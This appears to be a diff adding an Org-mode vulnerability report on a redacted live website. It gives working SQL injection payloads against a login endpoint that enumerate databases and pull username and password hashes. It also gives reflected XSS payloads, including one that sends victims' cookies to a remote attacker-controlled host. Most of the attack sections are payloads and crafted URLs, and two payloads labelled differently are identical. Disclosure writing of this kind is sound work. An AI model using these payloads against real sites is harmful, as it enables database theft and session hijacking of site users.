@@ -1,0 +1,98 @@
+* Redacted Information
+As per request the original URLs, parameter names and return values have been replaced.
+
+* SQL Injection in login
+
+There are two ways of talking to the authentication function, the login form on the main site or providing the parameters via URL directly.
+
+- =https://www.<[SITE]>.org/ws/cl.php?p=auth&username=my-username&password=my-password&d[p]=auth&d[username]=my-username&d[password]=my-password=
+
+Including a ='= in the user field of the form or the =username= and =d[username]= parameters we can trigger an error complaining about SQL syntax.
+The error is partially shown as part of the login form but can be read completely in both the browser's console or the returned page when using the direct URL.
+Since error messages are returned to the user it is eventually possible to use those to get more information out of the database.
+
+** Forcing XPath errors
+
+We can force errors in XPath when using =extractvalue()= and concating the data we want with an invalid symbol like =0x0a= or =0x3a=.
+
+A payload like
+- =a' OR extractvalue(rand(), concat(0x3a, version())) --%20=
+  - Note: the =%20= represents a whitespace at the end which is imporant to include!
+- URL encoded:
+#+BEGIN_SRC 
+https://www.<thesite>.org/ws/cl.php?p=auth&username=a%27+OR+extractvalue(rand()%2Cconcat(0x3a%2Cversion()))+--+&password=my-password&d[p]=auth&d[username]=a%27+OR+extractvalue(rand()%2Cconcat(0x3a%2Cversion()))+--+&d[password]=my-password
+#+END_SRC
+
+will return
+#+BEGIN_SRC
+{"0":{"s":"anon","isUser":"true","pwd":"true","username":"a' OR extractvalue(rand(), concat(0x3a, version())) -- ","error":"Message: XPATH syntax error:'<[DATABASEVERSION]>'"}
+#+END_SRC
+
+*** Enumerating Databases
+
+With the following payloads it is possible to get an overview of the databases, their tables aswell as their content.
+
+- Version
+  #+BEGIN_SRC
+    a’ OR extractvalue(rand(),concat(0x3a,version())) --%20
+  #+END_SRC
+- Database user
+  #+BEGIN_SRC
+  a’ OR extractvalue(rand(),concat(0x3a,version())) --%20
+  #+END_SRC
+- Databases
+  - db1
+    #+BEGIN_SRC
+    a’ OR extractvalue(0x0a,concat(0x0a,(select database()))) --%20
+    #+END_SRC
+  - db2
+    #+BEGIN_SRC
+    a’ OR extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 1,1))) --%20
+#+END_SRC
+
+Limits are used to specify subsets of returned data, selecting individual rows.
+
+- Tables
+  - Users in db2
+    #+BEGIN_SRC
+    a’ OR extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema="db2" limit 27,1))) --%20
+    #+END_SRC
+
+- User entries
+  #+BEGIN_SRC
+  a’ OR extractvalue(rand(),concat(0x3a,(SELECT concat(username,0x3a,password) FROM ‘db2‘.userdb LIMIT 0,1))) --%20
+  #+END_SRC
+
+  This returns something like =user1:<[hash]>= but it is not the full hash, the last few characters are missing. Turns out the error message
+  is limited to 32 characters. Since we have to atleast concat one /special/ character with the desired data it is possible to get at most 31 characters
+  of the hash which leaves 16 options for the remaining character.
+
+* XSS in log query
+
+Similarly to the URL for the SQLi from above there exists another URL which seems to be used to query logs.
+
+- =https://www.<[SITE]>.org/ws/cl.php?p=log&query=my-query=
+
+The queries are put back on the site which eventually makes reflected XSS possible.
+
+A payload like this bypasses the filters in place that ban script tags and regular slashes at minimum.
+
+#+BEGIN_SRC
+<img src=x onerror=this.src=alert(origin);this.removeAttribute(’onerror’);>
+#+END_SRC
+
+As URL:
+#+BEGIN_SRC
+https://www.<[SITE]>.org/ws/cl.php?p=log&query=%3Cimg%20src=x%20onerror=this.src=alert(origin);this.removeAttribute(%27onerror%27);%3E
+#+END_SRC
+Removing the =onerror= attribute at the end prevents the function from running in an infinite loop.
+
+With this it is possible to have users send out their cookies by just clicking a forged link or run similar javascript in their browser.
+
+#+BEGIN_SRC
+<img src=x onerror=this.src='https://<[IP]>:<[PORT]>/'+document.cookie;this.removeAttribute('onerror');>
+#+END_SRC
+
+Example log from me sending my own cookie to a remote machine controlled by myself.
+[[file:redacted_xss_get_cookie.png]]
+
